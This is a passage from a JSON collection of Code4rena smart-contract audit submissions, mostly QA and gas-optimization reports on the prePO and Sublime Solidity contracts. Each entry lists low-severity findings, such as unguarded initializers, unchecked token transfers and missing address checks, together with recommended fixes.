contracts.\n\n```\nhttps://github.com/code-423n4/2022-03-prepo/blob/d62d7146b27fd39a5f1358ffde08766724886cf5/contracts/core/Collateral.sol#L38\n```\n\n2. initialize functions does not have access control. They are vulnerable to front-running.\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\nWhile the code that can be run in contract constructors is limited, setting the owner in the contract's constructor to the `msg.sender` and adding the `onlyOwner` modifier to all **initializers** would be a sufficient level of access control.\n\n# C4-007 :  Use safeTransfer/safeTransferFrom consistently instead of transfer/transferFrom\n\n## Impact -  LOW\n\nIt is good to add a require() statement that checks the return value of token transfers or to use something like OpenZeppelin’s safeTransfer/safeTransferFrom unless one is sure the given token reverts in case of a failure. Failure to do so will cause silent failures of transfers and affect token accounting in contract.\n\nReference: This similar medium-severity finding from Consensys Diligence Audit of Fei Protocol: https://consensys.net/diligence/audits/2021/01/fei-protocol/#unchecked-return-value-for-iweth-transfer-call\n\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n2. transfer/transferFrom functions are used instead of safe transfer/transferFrom on the following contracts.\n\n```\nhttps://github.com/code-423n4/2022-03-prepo/blob/d62d7146b27fd39a5f1358ffde08766724886cf5/contracts/core/PrePOMarket.sol#L121\n\nhttps://github.com/code-423n4/2022-03-prepo/blob/d62d7146b27fd39a5f1358ffde08766724886cf5/contracts/core/PrePOMarket.sol#L123\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider using safeTransfer/safeTransferFrom or require() consistently.\n\n# C4-008 :  Consider making contracts Pausable\n\n## Impact -  LOW\n\nThere are many external risks so my suggestion is that you should consider making the contracts pausable, so in case of an unexpected event, the admin can pause transfers.\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider making contracts Pausable https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/Pausable.sol.\n\n# C4-008 : Critical changes should use two-step procedure\n\n## Impact - NON CRITICAL\n\nThe owner is the authorized user in the cosmwasm contracts. Usually, an owner can be updated with update_config function. However, the process is only completed with single transaction. If the address is updated incorrectly, an owner functionality will be lost forever.\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\nhttps://github.com/code-423n4/2022-03-prepo/blob/d62d7146b27fd39a5f1358ffde08766724886cf5/contracts/core/SingleStrategyController.sol#L75\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nLack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions.\n\n# C4-009 : # DoS With Block Gas Limit\n\n## Impact -  Non-Critical\n\nWhen smart contracts are deployed or functions inside them are called, the execution of these actions always requires a certain amount of gas, based of how much computation is needed to complete them. The Ethereum network specifies a block gas limit and the sum of all transactions included in a block can not exceed the threshold.\n\nProgramming patterns that are harmless in centralized applications can lead to Denial of Service conditions in smart contracts when the cost of executing a function exceeds the block gas limit. Modifying an array of unknown size, that increases in size over time, can lead to such a Denial of Service condition.\n\n## Proof of Concept\n\n1. Follow the functions shown below.\n\nhttps://github.com/code-423n4/2022-03-prepo/blob/d62d7146b27fd39a5f1358ffde08766724886cf5/contracts/core/AccountAccessController.sol#L44\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nCaution is advised when you expect to have large arrays that grow over time. Actions that require looping across the entire data structure should be avoided.\n\nIf you absolutely must loop over an array of unknown size, then you should plan for it to potentially take multiple blocks, and therefore require multiple transactions.\n\n# C4-010 : # USE SAFEERC20.SAFEAPPROVE INSTEAD OF APPROVE\n\n## Impact - LOW\n\nThis is probably an oversight since SafeERC20 was imported and safeTransfer() was used for ERC20 token transfers. Nevertheless, note that approve() will fail for certain token implementations that do not return a boolean value (). Hence it is recommend to use safeApprove().\n\n\n## Proof of Concept\n\n1. Navigate to \"https://github.com/code-423n4/2022-03-prepo/blob/d62d7146b27fd39a5f1358ffde08766724886cf5/contracts/core/SingleStrategyController.sol#L60\" and \"https://github.com/code-423n4/2022-03-prepo/blob/d62d7146b27fd39a5f1358ffde08766724886cf5/contracts/core/SingleStrategyController.sol#L62\".\n2. Preview approveUnderlying function on the contract.\n3. approve function has been used instead of SafeApprove.\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\nUpdate to _token.safeApprove(spender, type(uint256).max) in the function.\n\n# C4-011 : # Missing Vault Input Validation\n\n## Impact - LOW\n\nDuring the code review, It has been observed that vault is not validated. The address check should be added into the function.\n\n## Proof Of Concept\n\n1. https://github.com/code-423n4/2022-03-prepo/blob/d62d7146b27fd39a5f1358ffde08766724886cf5/contracts/core/SingleStrategyController.sol#L75\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\nAdd address check on the function.\n",
    "dataSource": {
      "name": "code-423n4/2022-03-prepo-findings",
      "repo": "https://github.com/code-423n4/2022-03-prepo-findings",
      "url": "https://github.com/code-423n4/2022-03-prepo-findings/issues/113"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA Report\n\n## Non-Critical Findings\n\n### Contract implementations should inherit their interface\n\n#### Description\n\nIt's best practice for a contract to inherit from it's interface. This improves the contract's clarity and makes sure the contract implementation complies with the defined interface.\n\n#### Findings\n\n[LongShortToken.sol](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/LongShortToken.sol#L8):\n\n```solidity\ncontract LongShortToken is ILongShortToken, ERC20Burnable, Ownable { // @audit-info add interface ILongShortToken\n  ...\n}\n```\n\n#### Recommended mitigation steps\n\nInherit from the missing interface or contract.\n\n---\n\n### Use scientific notation `1e10` instead of using many zeros\n\n#### Description\n\nFor better readability and to prevent any issues, use the scientific notation `1e10` instead of e.g. 1000000\n\n#### Findings\n\n[Collateral.FEE_DENOMINATOR](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/Collateral.sol#L35): `1000000` -> use `1e6`<br/>\n[PrePOMarket.FEE_DENOMINATOR](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/PrePOMarket.sol#L32): `1000000` -> use `1e6`<br/>\n\n---\n\n### Boolean constants can be used directly and do not need to be compare to `true` or `false`\n\n#### Description\n\nBoolean constants can be used directly and do not need to be compare to true or false.\n\n#### Findings\n\n[Collateral.deposit()](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/Collateral.sol#L86)\n\n#### Recommended mitigation steps\n\nRemove the equality to the boolean constant.\n\n---\n\n### Remove empty blocks of code\n\n#### Description\n\nCode contains empty block. See https://protofire.github.io/solhint/docs/rules/best-practises/no-empty-blocks.html\n\n#### Findings\n\n[AccountAccessController.constructor()](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/AccountAccessController.sol#L15)\n\n#### Recommended mitigation steps\n\nRemove empty code block\n\n---\n\n### Use interface `ICollateral` instead of `IERC20`\n\n#### Description\n\nUse more specific interface `ICollateral` instead of the general interface `IERC20` for code clarity.\n\n#### Findings\n\n[PrePOMarket.\\_collateral](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/PrePOMarket.sol#L13)\n[PrePOMarket.constructor()](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/PrePOMarket.sol#L70)\n\n#### Recommended mitigation steps\n\nChange variable type `IERC20` to `ICollateral`:\n\n```solidity\nICollateral private immutable _collateral;\n```\n\nand\n\n```solidity\n_collateral = ICollateral(_newCollateral);\n```\n\n## Low Risk\n\n### Wrong calculation of shares mentioned in comment of `Collateral.deposit()`\n\n#### Description\n\nIn the comments, right next to the actual implementation of the calculation of shares, the formula is wrong. The implementation itself is correct.\n\n**Wrong calculation:**\n\n```solidity\n/**\n  * # of shares owed = amount deposited / cost per share, cost per\n  * share = total supply / total value.\n  */\n```\n\n**Correct calculation:**\n\n```solidity\n/**\n  * # of shares owed = amount deposited / cost per share, cost per\n  * share = total value / total supply. @audit-info swapped total value with total supply\n  */\n```\n\n#### Findings\n\n[Collateral.deposit()](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/Collateral.sol#L86)\n\n#### Recommended mitigation steps\n\nFix comment to prevent confusion with actual implementation.\n\n---\n\n### Zero-address checks are missing\n\n#### Description\n\nZero-address checks are a best-practice for input validation of critical address parameters. While the codebase applies this to most most cases, there are many places where this is missing in constructors and setters.\n\nImpact: Accidental use of zero-addresses may result in exceptions, burn fees/tokens or force redeployment of contracts.\n\n#### Findings\n\n[Collateral.initialize()#\\_newTreasury](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/Collateral.sol#L49)\n\n#### Recommended mitigation steps\n\nAdd zero-address checks, e.g.:\n\n```solidity\nrequire(address(_newTreasury) != address(0), \"Zero address\");\n```\n\n---\n\n### Parameter order of `PrePOMarketFactory.createMarket()` is different than defined in interface `IPrePOMarketFactory.createMarket()`\n\n#### Description\n\nThe order of parameters in the contract implementation `PrePOMarketFactory` is different than how parameters are defined in the interface.\n\n#### Findings\n\n[PrePOMarketFactory.createMarket()](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/PrePOMarketFactory.sol#L45)\n\n#### Recommended mitigation steps\n\nEither change the order of parameters in the interface `IPrePOMarketFactory` to match the implementation or update the implementation.\n\n[IPrePOMarketFactory.createMarket()](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/interfaces/IPrePOMarketFactory.sol#L45)\n\n```solidity\nfunction createMarket(\n    string memory _tokenNameSuffix,\n    string memory _tokenSymbolSuffix,\n    address _governance,\n    address _collateral,\n    uint256 _floorLongPrice,\n    uint256 _ceilingLongPrice,\n    uint256 _floorValuation,\n    uint256 _ceilingValuation,\n    uint256 _mintingFee,\n    uint256 _redemptionFee,\n    uint256 _expiryTime\n) external override onlyOwner nonReentrant {\n```\n\n[PrePOMarketFactory.createMarket()](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/PrePOMarketFactory.sol#L45)\n\n```solidity\nfunction createMarket(\n    string memory tokenNameSuffix,\n    string memory tokenSymbolSuffix,\n    address collateral, // @audit-info `collateral` and `governance` parameters are switched compared to how they are defined in the interface\n    address governance,\n    uint256 floorLongPrice,\n    uint256 ceilingLongPrice,\n    uint256 floorValuation,\n    uint256 ceilingValuation,\n    uint256 mintingFee,\n    uint256 redemptionFee,\n    uint256 expiryTime\n) external override onlyOwner nonReentrant {\n```\n",
    "dataSource": {
      "name": "code-423n4/2022-03-prepo-findings",
      "repo": "https://github.com/code-423n4/2022-03-prepo-findings",
      "url": "https://github.com/code-423n4/2022-03-prepo-findings/issues/110"
    }
  },
  {
    "title": "QA Report",
    "body": "## Low-impact Issues\n\n### Missing checks for `address(0x0)` when assigning values to `address` state variables\n\n1. File: contracts/core/PrePOMarket.sol (line [68](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/PrePOMarket.sol#L68))\n```solidity\n        _treasury = _governance;\n```\n2. File: contracts/core/PrePOMarket.sol (line [176](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/PrePOMarket.sol#L176))\n```solidity\n        _treasury = _newTreasury;\n```\n3. File: contracts/core/SingleStrategyController.sol (line [75](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/SingleStrategyController.sol#L75))\n```solidity\n        _vault = _newVault;\n```\n4. File: contracts/core/WithdrawHook.sol (line [30](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/WithdrawHook.sol#L30))\n```solidity\n        _vault = _newVault;\n```\n5. File: contracts/core/DepositHook.sol (line [40](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/DepositHook.sol#L40))\n```solidity\n        _vault = _newVault;\n```\n6. File: contracts/core/Collateral.sol (line [49](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/Collateral.sol#L49))\n```solidity\n        _treasury = _newTreasury;\n```\n\n### `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`\nUse `abi.encode()` instead which will pad items to 32 bytes, which will prevent hash collisions (e.g. `abi.encodePacked(0x123,0x456)` => `0x123456` => `abi.encodePacked(0x1,0x23456)`, but `abi.encode(0x123,0x456)` => `0x0...1230...456`). If there is only one argument to `abi.encodePacked()` it can often be cast to `bytes()` or `bytes32()` instead.\n\n1. File: contracts/core/PrePOMarketFactory.sol (line [61](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/PrePOMarketFactory.sol#L61))\n```solidity\n        bytes32 _salt = keccak256(abi.encodePacked(_longToken, _shortToken));\n```\n2. File: contracts/core/AccountAccessController.sol (line [66](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/AccountAccessController.sol#L66))\n```solidity\n        bytes32 _leaf = keccak256(abi.encodePacked(msg.sender));\n```\n\n### Upgradeable contract is missing a `__gap[50]` storage variable to allow for new storage variables in later versions\nSee [this](https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps) link for a description of this storage variable. While some contracts may not currently be sub-classed, adding the variable now protects against forgetting to add it in the future.\n\n1. File: contracts/core/PrePOMarketFactory.sol (lines [12-15](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/PrePOMarketFactory.sol#L12-L15))\n```solidity\ncontract PrePOMarketFactory is\n    IPrePOMarketFactory,\n    OwnableUpgradeable,\n    ReentrancyGuardUpgradeable\n```\n2. File: contracts/core/Collateral.sol (lines [13-17](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/Collateral.sol#L13-L17))\n```solidity\ncontract Collateral is\n    ICollateral,\n    ERC20Upgradeable,\n    OwnableUpgradeable,\n    ReentrancyGuardUpgradeable\n```\n\n## Non-critical Issues\n\n\n### Multiple `address` mappings can be combined into a single `mapping` of an `address` to a `struct`, where appropriate\n\n1. File: contracts/core/CollateralDepositRecord.sol (lines [11-12](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/CollateralDepositRecord.sol#L11-L12))\n```solidity\n    mapping(address => uint256) private _accountToNetDeposit;\n    mapping(address => bool) private _allowedHooks;\n```\n\n### Large multiples of ten should use scientific notation (e.g. `1e6`) rather than decimal literals (e.g. `1000000`), for readability\n\n1. File: contracts/core/PrePOMarket.sol (line [32](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/PrePOMarket.sol#L32))\n```solidity\n    uint256 private constant FEE_DENOMINATOR = 1000000;\n```\n2. File: contracts/core/Collateral.sol (line [35](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/Collateral.sol#L35))\n```solidity\n    uint256 private constant FEE_DENOMINATOR = 1000000;\n```\n\n### Use a more recent version of solidity\nUse a solidity version of at least 0.8.12 to get `string.concat()` to be used instead of `abi.encodePacked(<str>,<str>)`\n\n1. File: contracts/core/PrePOMarketFactory.sol (line [2](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/PrePOMarketFactory.sol#L2))\n```solidity\npragma solidity =0.8.7;\n```\n2. File: contracts/core/AccountAccessController.sol (line [2](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/AccountAccessController.sol#L2))\n```solidity\npragma solidity =0.8.7;\n```\n\n### Non-exploitable reentrancies\nFollow the best-practice of the [Checks-Effects-Interactions](https://docs.soliditylang.org/en/v0.4.21/security-considerations.html#re-entrancy) pattern\nReentrancy in Collateral.deposit(uint256) (contracts/core/Collateral.sol#52-93):\n\tExternal calls:\n\t- _baseToken.safeTransferFrom(msg.sender,address(this),_amount) (contracts/core/Collateral.sol#59)\n\t- _depositHook.hook(msg.sender,_amount,_amountToDeposit) (contracts/core/Collateral.sol#64)\n\t- _baseToken.safeTransfer(_treasury,_fee) (contracts/core/Collateral.sol#72)\n\t- _baseToken.approve(address(_strategyController),_amountToDeposit) (contracts/core/Collateral.sol#76)\n\t- _strategyController.deposit(_amountToDeposit) (contracts/core/Collateral.sol#77)\n\tState variables written after the call(s):\n\t- _mint(msg.sender,_shares) (contracts/core/Collateral.sol#91)\n\t\t- _balances[account] += amount (node_modules/@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol#264)\n\t- _mint(msg.sender,_shares) (contracts/core/Collateral.sol#91)\n\t\t- _totalSupply += amount (node_modules/@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol#263)\n\nReentrancy in PrePOMarketFactory.createMarket(string,string,address,address,uint256,uint256,uint256,uint256,uint256,uint256,uint256) (contracts/core/PrePOMarketFactory.sol#42-82):\n\tExternal calls:\n\t- _longToken.transferOwnership(address(_newMarket)) (contracts/core/PrePOMarketFactory.sol#79)\n\t- _shortToken.transferOwnership(address(_newMarket)) (contracts/core/PrePOMarketFactory.sol#80)\n\tEvent emitted after the call(s):\n\t- MarketAdded(address(_newMarket),_salt) (contracts/core/PrePOMarketFactory.sol#81)\nReentrancy in Collateral.deposit(uint256) (contracts/core/Collateral.sol#52-93):\n\tExternal calls:\n\t- _baseToken.safeTransferFrom(msg.sender,address(this),_amount) (contracts/core/Collateral.sol#59)\n\t- _depositHook.hook(msg.sender,_amount,_amountToDeposit) (contracts/core/Collateral.sol#64)\n\t- _baseToken.safeTransfer(_treasury,_fee) (contracts/core/Collateral.sol#72)\n\t- _baseToken.approve(address(_strategyController),_amountToDeposit) (contracts/core/Collateral.sol#76)\n\t- _strategyController.deposit(_amountToDeposit) (contracts/core/Collateral.sol#77)\n\tEvent emitted after the call(s):\n\t- Transfer(address(0),account,amount) (node_modules/@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol#265)\n\t\t- _mint(msg.sender,_shares) (contracts/core/Collateral.sol#91)\nReentrancy in SingleStrategyController.migrate(IStrategy) (contracts/core/SingleStrategyController.sol#51-72):\n\tExternal calls:\n\t- _baseToken.approve(address(_newStrategy),type()(uint256).max) (contracts/core/SingleStrategyController.sol#60)\n\t- _baseToken.approve(address(_oldStrategy),0) (contracts/core/SingleStrategyController.sol#62)\n\t- _oldStrategy.withdraw(address(this),_oldStrategyBalance) (contracts/core/SingleStrategyController.sol#64)\n\t- _newStrategy.deposit(_baseToken.balanceOf(address(this))) (contracts/core/SingleStrategyController.sol#65)\n\tEvent emitted after the call(s):\n\t- StrategyMigrated(address(_oldStrategy),address(_newStrategy),_oldStrategyBalance) (contracts/core/SingleStrategyController.sol#67-71)\nReentrancy in PrePOMarket.mintLongShortTokens(uint256) (contracts/core/PrePOMarket.sol#101-128):\n\tExternal calls:\n\t- _collateral.transferFrom(msg.sender,_treasury,_fee) (contracts/core/PrePOMarket.sol#121)\n\t- _collateral.transferFrom(msg.sender,address(this),_amount) (contracts/core/PrePOMarket.sol#123)\n\t- _longToken.mint(msg.sender,_amount) (contracts/core/PrePOMarket.sol#124)\n\t- _shortToken.mint(msg.sender,_amount) (contracts/core/PrePOMarket.sol#125)\n\tEvent emitted after the call(s):\n\t- Mint(msg.sender,_amount) (contracts/core/PrePOMarket.sol#126)\nReentrancy in PrePOMarket.redeem(uint256,uint256) (contracts/core/PrePOMarket.sol#130-173):\n\tExternal calls:\n\t- _longToken.burnFrom(msg.sender,_longAmount) (contracts/core/PrePOMarket.sol#158)\n\t- _shortToken.burnFrom(msg.sender,_shortAmount) (contracts/core/PrePOMarket.sol#159)\n\t- _collateral.transfer(_treasury,_fee) (contracts/core/PrePOMarket.sol#168)\n\t- _collateral.transfer(msg.sender,_collateralOwed) (contracts/core/PrePOMarket.sol#170)\n\tEvent emitted after the call(s):\n\t- Redemption(msg.sender,_collateralOwed) (contracts/core/PrePOMarket.sol#172)\n",
    "dataSource": {
      "name": "code-423n4/2022-03-prepo-findings",
      "repo": "https://github.com/code-423n4/2022-03-prepo-findings",
      "url": "https://github.com/code-423n4/2022-03-prepo-findings/issues/104"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "gas\n\n#1 Gas improvement on calling SafeERC20.function\nBy removing [L26](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L26) and calling `SafeERC20.function` directly at line which calling the function can save gas per call\nFor instance: [L754](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L754)\n```\nSafeERC20.safeTransferFrom(_collateralAsset, msg.sender, address(this), _amount);\n```\nCan also implemented on SafeMath but not recommended because of readibilty\n\n\n#2 Using multiple `require()` instead of &&\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L406\nBy using multiple `require()` than && can save execution gas cost.\n\n\n#3 Gas improvement when validating with `isWithinLimits` function\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L368-L386\nBy removing the `isWithinLimits` returns and validate directly in it instead of checking the `isWithinLimits` value == true can save both deployment and execution gas:\n```\nfunction isWithinLimits(\n        uint256 _value,\n        uint256 _min,\n        uint256 _max\n    ) internal pure{\n        if (_min != 0 && _max != 0) {\n            // If both min and max limits exist\n            require(_value >= _min && _value <= _max,'ILB1'); //@audit-info validate here\n        } else if (_min != 0) {\n            // if only min limit exists\n            require(_value >= _min);\n        } else if (_max != 0) {\n            // if only max limit exists\n            require(_value <= _max);\n        }//@audit-info remove else because no need to validate if both _min && _max == 0\n    }\n    function foo()external pure{\n        isWithinLimits(0,0,0); //@audit-info call it without require()\n    }\n```\nCurrently there are a lot `isWithinLimits` call in the contract included with `require()` so it can also save deployment gas by calling the function without `require()`\n\n\n#4 Placement of require statement in `_limitBorrowedInUSD`\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L394\nThe `require()` statement can be place earlier to prevent execution of code above it in case the value of it == false to save gas\n\n\n#5 Unnecessary `withdrawableCollateral` MSTORE\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L777\nBy calling `withdrawableCollateral(_id)` directly to L778 without caching it can save gas. The `withdrawableCollateral` var was just called once in the function:\n```\n//@audit-info remove L777\nrequire(_amount <= _withdrawableCollateral(_id), 'WC1');\n```\n\n\n#6 Relocation of if() condition check\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L950\nIts imposible _max <= _currentDebt == true if _maxPossible == type(uint).max. This condition will only occur inside `if(collateralRatio != 0)`, therefore put it inside the if condition (L944) will prevent `if (_maxPossible <= _currentDebt)` code read:\n\n```\nif (_collateralRatio != 0) {\n            _maxPossible = _totalCollateralToken.mul(_ratioOfPrices).div(_collateralRatio).mul(SCALING_FACTOR).div(10**_decimals);\n\tif (_maxPossible <= _currentDebt) return 0;\n        }\n```\n\n\n#7 Using > is cheaper than >=\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L315\n1 second difference can be ignored to validate `_startTime` using > can save gas\n\n\n#8 Avoiding SLOAD to emit event\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/Verification/twitterVerifier.sol#L209\nUse `_signerAddress` to emit `SignerUpdated` event\n\n\n#9 Using at least pragma solidity 0.8.4\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L2\nSome contract are using `SafeMath` lib to do math operation. By using pragma 0.8.4, the gas cost can be reduced due to SafeMath by default\n\n\n#10 caching var.length for loop\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L670\nBy caching ids.length to newVar, can save gas:\n```\nUint newVar = ids.lenght\nfor (uint256 i; i < newVar; ++i)\n```\n\n#11 Store array parameters in calldata\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L665-L666\nusing calldata to store `ids` and `amounts` can save gas\n\n\n#12 using -= for gas saving\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L681\n```\ntotalSupply[id] -= amount\n```",
    "dataSource": {
      "name": "code-423n4/2022-03-sublime-findings",
      "repo": "https://github.com/code-423n4/2022-03-sublime-findings",
      "url": "https://github.com/code-423n4/2022-03-sublime-findings/issues/83"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "Sublime-v1 gas optimization\n\n1 code duplication. The following functions contain the same code. To save deployment gas costs you can use internal function for duplication code. If you can use the same error message you can save a little bit more gas. Please check the following example.\n\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/Verification/twitterVerifier.sol#L154-L178\n\nfunction unregisterSelf() external {\n    string memory _userdata = userData[msg.sender].twitterId;\n    unregister(_userdata, msg.sender);\n}\n \n/**\n  * @notice used to unregister user\n  * @dev owners can unregister users\n*/\nfunction unregisterUser(address _user) external onlyOwner {\n    string memory _userdata = userData[_user].twitterId;\n    unregister(_userdata, _user);\n}\n \nfunction unregister(string memory _userdata, address _user) internal {\n    require(bytes(_userdata).length != 0, 'UR1');\n    delete twitterIdMap[_userdata];\n    delete userData[_user];\n    verification.unregisterMasterAddress(_user, address(this));\n    emit UserUnregistered(_user);\n}\n\n\n\n2 _minBorrowLimitInUSD is used only one time in the _limitBorrowedInUSD, so you can delete _minBorrowLimitInUSD to save gas. \n https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L395-L396\n\nrequire(_minBorrowAmount.mul(_ratioOfPrices).div(10**_decimals >= _borrowLimitMin, 'ILB3');\n\n\n\n3 use cache for pooledCLConstants[_id] in _accept. In _accept pooledCLConstants[_id] will be called many times. To save gas you can cache pooledCLConstants[_id].\n\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L332-L343\n\nfunction _accept(uint256 _id, uint256 _amount) internal {\n        LenderPoolConstants storage pooledCLConstant = pooledCLConstants[_id];\n        address _borrowAsset = pooledCLConstant.borrowAsset;\n        address _strategy = pooledCLConstant.borrowAssetStrategy;\n        IERC20(_borrowAsset).safeApprove(_strategy, _amount);\n        pooledCLVariables[_id].sharesHeld = SAVINGS_ACCOUNT.deposit(_borrowAsset, _strategy, address(this), _amount);\n \n        POOLED_CREDIT_LINE.accept(_id, _amount);\n \n        pooledCLConstant.borrowLimit = _amount;\n        delete pooledCLConstant.startTime;\n        delete pooledCLConstant.minBorrowAmount;\n    }\n\n\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-03-sublime-findings",
      "repo": "https://github.com/code-423n4/2022-03-sublime-findings",
      "url": "https://github.com/code-423n4/2022-03-sublime-findings/issues/80"
    }
  },
  {
    "title": "QA Report",
    "body": "# C4-001 : Incompatibility With Rebasing/Deflationary/Inflationary tokens\n\n## Impact -  LOW\n\nPrePo protocol do not appear to support rebasing/deflationary/inflationary tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the amount of tokens transferred to contracts before and after the actual transfer to infer any fees/interest.\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L1024\n\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L754\n\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L295\n```\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\n- Ensure that to check previous balance/after balance  equals to amount for any rebasing/inflation/deflation\n- Add support in contracts for such tokens before accepting user-supplied tokens\n- Consider supporting deflationary / rebasing / etc tokens by extra checking the balances before/after or strictly inform your users not to use such tokens if they don't want to lose them.\n\n# C4-002 : Front-runnable Initializers\n\n## Impact - LOW\n\nAll contract **initializers** were missing access controls, allowing any user to initialize the contract. By front-running the contract deployers to initialize the contract, the incorrect parameters may be supplied, leaving the contract needing to be redeployed.\n\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L223\n```\n\n2. initialize functions does not have access control. They are vulnerable to front-running.\n\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\nWhile the code that can be run in contract constructors is limited, setting the owner in the contract's constructor to the `msg.sender` and adding the `onlyOwner` modifier to all **initializers** would be a sufficient level of access control.\n\n\n# C4-003 : transferOwnership should be two step process\n\n## Impact\n\n\"QuantConfig.sol\" inherit OpenZeppelin's OwnableUpgradeable contract which enables the onlyOwner role to transfer ownership to another address. It's possible that the onlyOwner role mistakenly transfers ownership to the wrong address, resulting in a loss of the onlyOwner role. The current ownership transfer process involves the current owner calling Unlock.transferOwnership(). This function checks the new owner is not the zero address and proceeds to write the new owner's address into the owner's state variable. If the nominated EOA account is not a valid account, it is entirely possible the owner may accidentally transfer ownership to an uncontrolled account, breaking all functions with the onlyOwner() modifier. Lack of two-step procedure for critical operations leaves them error-prone\nif the address is incorrect, the new address will take on the functionality of the new role immediately\n\nfor Ex : -Alice deploys a new version of the whitehack group address. When she invokes the whitehack group address setter to replace the address, she accidentally enters the wrong address. The new address now has access to the role immediately and is too late to revert\n\n\n## Proof of 